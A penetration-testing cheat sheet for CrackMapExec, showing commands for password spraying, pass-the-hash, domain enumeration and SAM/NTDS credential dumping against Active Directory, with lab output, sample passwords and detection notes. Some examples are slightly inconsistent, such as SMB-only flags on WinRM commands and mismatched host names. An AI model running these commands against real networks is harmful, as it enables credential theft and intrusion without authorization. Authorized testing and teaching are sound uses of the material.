# CrackMapExec (CME)

## Overview

**CrackMapExec (CME)** is a post-exploitation and lateral movement framework designed for assessing the security of **Active Directory (AD)** environments. It enables security professionals to authenticate, enumerate, and execute actions across Windows networks at scale.

> ⚠️ Use only in authorized environments (lab, red team engagement, or with written permission).

## Key Features

- Multi-protocol support:
  - SMB
  - WinRM
  - LDAP
  - MSSQL
- Credential validation and password spraying
- Hash authentication (Pass-the-Hash)
- Domain and local enumeration
- Remote command execution
- SAM and NTDS dumping (with sufficient privileges)
- Share and permission enumeration

---

## Installation

### Kali Linux
```bash
sudo apt install crackmapexec
```

### From Source
```bash
git clone https://github.com/byt3bl33d3r/CrackMapExec.git
cd CrackMapExec
pip install -r requirements.txt
```

---

## Basic Syntax
```bash
crackmapexec <protocol> <target> -u <username> -p <password> [options]
```

### Example
```bash
crackmapexec smb 192.168.1.50 -u administrator -p 'Password123'
```

---

## SMB Module

### Authentication Test
```bash
crackmapexec smb 192.168.1.0/24 -u user -p 'Password123'
```

### Password Spraying
```bash
crackmapexec smb 192.168.1.0/24 -u user -p passwords.txt --continue-on-success
crackmapexec smb 192.168.1.0/24 -u administrator -p /opt/password.txt --continue-on-success
```

### Local Authentication
```bash
crackmapexec smb 192.168.1.50 -u admin -p 'Password123' --local-auth
```

---

## Enumeration Options

### Enumerate Shares
```bash
crackmapexec smb 192.168.1.50 -u user -p 'Password123' --shares
crackmapexec smb 192.168.1.101 -u administrator -p 'admin@12345' --local-auth --shares
```

### Enumerate Users
```bash
crackmapexec smb 192.168.1.50 -u user -p 'Password123' --users
crackmapexec smb 192.168.1.101 -u administrator -p 'admin@12345' --local-auth --users
```

### Enumerate Groups
```bash
crackmapexec smb 192.168.1.50 -u user -p 'Password123' --groups
crackmapexec smb 192.168.1.101 -u administrator -p 'admin@12345' --local-auth --groups
```

### Enumerate Computers
```bash
crackmapexec smb 192.168.1.50 -u user -p 'Password123' --computers
crackmapexec smb 192.168.1.101 -u administrator -p 'admin@12345' --local-auth --computers
```

### Dump Password Policy
```bash
crackmapexec smb 192.168.1.50 -u user -p 'Password123' --pass-pol
crackmapexec smb 192.168.1.101 -u administrator -p 'admin@12345' --local-auth --pass-pol
```

### Dump SAM Hashes
```bash
crackmapexec smb 192.168.1.50 -u user -p 'Password123' --sam
crackmapexec smb 192.168.1.101 -u administrator -p 'admin@12345' --local-auth --sam
```

### Dump NTDS (Domain Controller Required)
```bash
crackmapexec smb <DC-IP> -u administrator -p 'Password123' --ntds
crackmapexec smb 192.168.1.51 -u administrator -p '@rmour123' --ntds
```

---

## WinRM Module

### Basic Authentication
```bash
crackmapexec winrm 192.168.1.51 -u user -p 'Password123'
crackmapexec winrm 192.168.1.101 -u administrator -p 'admin@12345' --local-auth --sam
```

### Username & Password Lists
```bash
crackmapexec winrm 192.168.1.51 -u users.txt -p passwords.txt --continue-on-success
crackmapexec winrm 192.168.1.101 -u administrator -p 'admin@12345' --local-auth
```

### Local Authentication
```bash
crackmapexec winrm 192.168.1.51 -u administrator -p 'Password123' --local-auth
crackmapexec winrm 192.168.1.101 -u administrator -p 'admin@12345' --local-auth --sam
```

---

## Common Options

| Option | Description |
|--------|-------------|
| `--continue-on-success` | Continue after valid credentials are found |
| `--local-auth` | Authenticate against local SAM instead of domain |
| `--shares` | Enumerate SMB shares |
| `--users` | Enumerate domain users |
| `--groups` | Enumerate domain groups |
| `--pass-pol` | Retrieve password policy |
| `--sam` | Dump local SAM hashes |
| `--ntds` | Dump NTDS from Domain Controller |

---

## Typical Use Cases in AD Assessments

- Password spraying
- Credential validation
- Lateral movement
- Privilege escalation validation
- Share misconfiguration discovery
- Domain enumeration

---

## Defensive Detection Notes

Security teams should monitor for:
- Multiple SMB authentication attempts across hosts
- Lateral authentication patterns
- Abnormal WinRM usage
- NTDS or SAM access attempts
- Account lockout spikes

---

## Best Practices

- Always confirm account lockout thresholds before spraying.
- Start with small user/password sets.
- Prefer spraying over brute force in domain environments.
- Log and document all activity during authorized testing.

---

## Lab Results (Reference)

Example authenticated runs captured during lab testing against the `infosecwarrior.local` domain:

```text
crackmapexec smb 192.168.1.51 -u administrator -p '@rmour123'
SMB   192.168.1.51    445   SRV01   [*] Windows 11 / Server 2025 Build 26100 x64 (name:SRV01) (domain:SRV01) (signing:False) (SMBv1:False)
SMB   192.168.1.51    445   SRV01   [+] SRV01\administrator:@rmour123 (Pwn3d!)

crackmapexec smb 192.168.1.0/24 -u administrator -p '@rmour123'
SMB   192.168.1.101   445   WC01    [*] Windows 11 / Server 2025 Build 26100 x64 (name:WC01) (domain:infosecwarrior.local) (signing:True) (SMBv1:False)
SMB   192.168.1.101   445   WC01    [-] Connection Error: The NETBIOS connection with the remote host timed out.

crackmapexec smb 192.168.1.0/24 -u administrator -p Azlan@123
SMB   192.168.1.101   445   WC001   [*] Windows 11 / Server 2025 Build 26100 x64 (name:WC001) (domain:infosecwarrior.local) (signing:True) (SMBv1:False)
SMB   192.168.1.101   445   WC001   [+] infosecwarrior.local\administrator:Azlan@123 (Pwn3d!)

crackmapexec winrm 192.168.1.101 -u /opt/user.txt -p /opt/password.txt --continue-on-success
SMB   192.168.1.101   5985  WC01    [*] Windows 11 / Server 2025 Build 26100 (name:WC01) (domain:infosecwarrior.local)
HTTP  192.168.1.101   5985  WC01    [*] http://192.168.1.101:5985/wsman
```

**Takeaways:**
- `(Pwn3d!)` indicates the supplied credentials grant admin access on the target (valid for SMB command execution).
- Signing being `False` on a host (e.g., SRV01) is notable — SMB signing disabled increases risk of relay attacks.
- WinRM (port 5985) was reachable on WC01, confirming remote management access alongside SMB.
